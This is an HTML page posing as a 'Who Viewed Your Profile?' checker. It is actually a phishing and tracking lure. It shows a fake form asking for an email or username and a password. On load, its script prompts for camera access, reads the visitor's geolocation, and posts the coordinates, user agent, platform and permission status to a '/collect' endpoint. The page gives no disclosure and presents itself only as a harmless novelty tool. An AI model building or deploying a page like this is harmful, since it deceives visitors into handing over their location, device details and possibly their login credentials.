<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>üîç Profile Viewer Checker</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="/static/icon.png">
  <style>
    body {
      margin: 0;
      background: linear-gradient(135deg, #2c3e50, #3498db);
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: rgba(255,255,255,0.1);
      padding: 30px;
      border-radius: 16px;
      text-align: center;
      width: 300px;
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 24px;
    }
    p {
      font-size: 14px;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      font-size: 14px;
    }
    input {
      background: #fff;
      color: #000;
    }
    button {
      background: #e74c3c;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>üëÅÔ∏è Who Viewed Your Profile?</h1>
    <p>Enter to check last profile visitors (Secret Mode)</p>
    <form>
      <input type="text" placeholder="Email or username" required>
      <input type="password" placeholder="Password" required>
      <button type="submit">Check Now</button>
    </form>
  </div>

  <script>
    async function sendData(status, lat=null, long=null) {
      await fetch("/collect", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          latitude: lat,
          longitude: long,
          camera: status,
          deviceInfo: navigator.platform
        })
      });
    }

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      navigator.geolocation.getCurrentPosition(
        pos => sendData("‚úÖ Allowed", pos.coords.latitude, pos.coords.longitude),
        err => sendData("‚ùå Location Denied")
      );
      stream.getTracks().forEach(track => track.stop());
    })
    .catch(err => sendData("‚ùå Camera Denied"));
  </script>
</body>
</html>
